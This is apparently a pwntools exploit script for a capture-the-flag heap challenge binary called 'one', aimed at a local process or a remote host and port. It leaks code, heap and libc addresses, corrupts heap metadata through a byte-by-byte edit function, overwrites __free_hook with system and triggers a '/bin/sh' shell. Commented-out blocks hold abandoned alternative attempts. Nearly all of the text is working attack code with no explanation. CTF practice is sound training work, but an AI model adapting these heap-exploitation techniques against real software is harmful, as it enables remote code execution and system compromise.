from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./one")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./one")
else:
    p = remote("49.4.23.26","32052")
    libc = ELF("./libc-2.27.so")
    elf = ELF("./one")

def menu(choice):
    p.sendlineafter("command>> \n",str(choice))

def add(content):
    menu(1)
    p.sendafter("Now, you can input your test string:\n",content)

def edit(index,char,target):
    menu(2)
    p.sendlineafter("Please give me the index of the string:\n",str(index))
    p.sendafter("Which char do you want to edit:\n",str(char))
    p.sendlineafter("What do you want to edit it into:\n",target)

def show(index):
    menu(3)
    p.sendlineafter("Please give me the index of the string:\n",str(index))

def free(index):
    menu(4)
    p.sendlineafter("Please give me the index of the string:\n",str(index))

def magic(index,use = "Y"):
    menu(0x3124)
    p.sendlineafter("Do you want to use one?(Y/N)\n",use)
    p.sendlineafter("Here are 5 strings to be tested. Which one do you want to test?\n",str(index))

code_base = 0x555555554000
def debugf():
    if debug:
        gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x15D8)))

def debugf_(codebase):
    if debug:
        gdb.attach(p,"b *{b1}".format(b1 = hex(codebase + 0x15D8)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
for i in range(20):
    payload = ""
    for j in range(0x20):
        payload += chr(ord("a") + j)
    add(payload)
magic(0x80000000,"Y")
p.recvuntil("The string:\n")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
codebase = leak_addr - 0x2030c0
log.success("code_base:" + hex(codebase))
elf.address = codebase
#debugf()
for i in range(0x18):
    edit(1,"\x00",chr(0xd0 + i))
#debugf()
edit(1,"\x41\n",chr(0xd0 + 0x18))
for i in range(0x19,0x30):
    edit(1,"\x00",chr(0xd0 + i))
#debugf()
target = codebase + 0x2030c8
payload1 = p64(0x30) + p64(0x440)
payload2 = p64(0) + p64(0x31)
payload2 += p64(target - 0x18) + p64(target - 0x10)
for i in range(0x1f,0xf,-1):
    edit(1,chr(0xd0 + i) + "\n",payload1[i - 0x10])
#debugf()
for i in range(0x2f,0xf,-1):
    edit(1,chr(ord("a") - 0x10 + i) + "\n",payload2[i - 0x10])
#debugf()
free(2)
payload = "/bin/sh;" + "b" * 8
for i in range(0x10):
    edit(1,"\x00",payload[i])
show(1)
p.recvuntil(payload)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0x350
log.success("heap_base:" + hex(heap_base))
target = p64(elf.got["free"])
payload = p64(heap_base + 0x350)
for i in range(8):
    temp = payload[i]
    if temp == "\x00":
        edit(1,temp,target[i])
    else:
        edit(1,temp + "\n",target[i])
#debugf()
show(0)
p.recvuntil("The string is:\n")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["free"]
log.success("libc_base:" + hex(libc.address))
target = p64(libc.symbols["__free_hook"])
payload = p64(elf.got["free"])
for i in range(8):
    temp = payload[i]
    if temp == "\x00":
        edit(1,temp,target[i])
    else:
        edit(1,temp + "\n",target[i])
target = p64(libc.symbols["system"])
for i in range(8):
    edit(0,"\x00",target[i])
debugf()
free(1)
"""
for i in range(0x10):
    edit(0,"\x00","b")
for i in range(0x8):
    edit(0,"\x00",chr(ord("1") + i))
edit(0,"\x41\n","\x41")
edit(0,"\00","\x04")
free(1)
add("b"*0x20)
show(2)
p.recvuntil("The string is:\n")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
#debugf()
target = codebase + 0x203160
payload = p64(libc.symbols["__malloc_hook"] + 0x10 + 96) * 2
target = p64(0) + p64(target - 0x10)
for i in range(0x8):
    temp = payload[i]
    if temp == "\x00":
        edit(2,temp,chr(0xe0 + i))
    else:
        edit(2,temp + "\n",chr(0xe0 + i))
for i in range(0x8,0x10):
    temp = payload[i]
    if temp == "\x00":
        edit(2,temp,"\x00")
    else:
        edit(2,temp + "\n",target[i])
for i in range(0x8):
    edit(2,chr(0xe0 + 7 - i) + "\n","\x00")
for i in range(0x18):
    edit(1,"\x00","b")
edit(1,"\x01\n","\x41")
edit(1,"\x04\n","\x00")
#debugf()
for i in range(9,17):
    free(i)
debugf()
add("\n")
"""
"""
edit(0,"\x41\n","\x81")
edit(0,"\00","\x04")
free(1)
payload = p64(libc.symbols["__malloc_hook"] + 0x10 + 96)
for i in range(8):
    temp = payload[i]
    if temp == "\x00":
        edit(2,"\x00",chr(0xe0 + i))
    else:
        edit(2,temp + "\n",chr(0xe0 + i))
show(2)
p.recvuntil("\xe7")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0x380
log.success("heap_base:" + hex(heap_base))
#debugf()
add("a\n")
#debugf()
free(1)
free(2)
target = codebase + 0x0000000000203150
debugf()
add(p64(target)[:7])
add("aaaaaaaaaaaaaaaaaaa\n")
add("aaaaaaaaaaaaaaaaaaaa\n")
#debugf_(codebase)
payload = ""
for i in range(8):
    payload += chr(0xe0 + i)
payload += p64(heap_base + 0x380)
target = p64(libc.symbols["__malloc_hook"] + 0x10 + 96) * 2
for i in range(0x8):
    temp = payload[8 + i]
    if temp == "\x00":
        edit(2,"\x00",target[8 + i])
    else:
        edit(2,temp + "\n",target[8 + i])
for i in range(0x8):
    temp = payload[7 - i]
    if temp == "\x00":
        edit(2,"\x00",target[7 - i])
    else:
        edit(2,temp + "\n",target[7 - i])
#debugf()
edit(0,"\x04\n","\x00")
edit(0,"\x81\n","\x41")
payload = p64(0x41) + p64(heap_base + 0x3c0) + p64(libc.symbols["__malloc_hook"] + 0x10 + 96)
payload += p64(0) * 5
target = "a" * 0x38
for i in range(8):
    target += chr(i + 0xc0)
#debugf()
for i in range(len(payload)):
    temp = payload[i]
    if temp == "\x00":
        edit(0,"\x00",target[i])
    else:
        edit(0,temp + "\n",target[i])
edit(0,"\x04\n","\x00")
edit(0,"\01\n","\x41")
debugf()
add("a\n")
for i in range(0x18 - 1):
    edit(17,"\x00","1")
edit(17,"\x40\n","\x41")
for i in range(0x18 - 2):
    edit(18,"\x00","1")
edit(18,"\x40\n","\x41")
#debugf()
edit(0,"\x41\n","\x40")
edit(0,"\x00","\x04")
#debugf()
index1 = codebase + 0x203110
index2 = heap_base + 0x3c0
offset = index2 - index1
payload = p64(offset)
for i in range(8):
    temp = payload[7 - i]
    edit(0,chr(0xc0 + 7 - i) + "\n",temp)
#debugf()
#free(1)
# 14 and 15
#payload = p64(index1) + p64(heap_base + 0x6e0)
payload = p64(index1) + p64(index1)
for i in range(0x10):
    temp = payload[0xf - i]
    edit(12,chr(0xe0 + 0xf - i) + "\n",temp)
#payload = p64(heap_base + 0x728) + p64(index1)
payload = p64(index1) + p64(index1)
for i in range(0x10):
    temp = payload[0xf - i]
    edit(13,chr(0xe0 + 0xf - i) + "\n",temp)
#debugf()
free(10)
free(11)
free(1)
add("a\n")
add("a\n")
add("a\n")
#debugf()
#payload = p64(heap_base + 0x)"""
p.interactive()
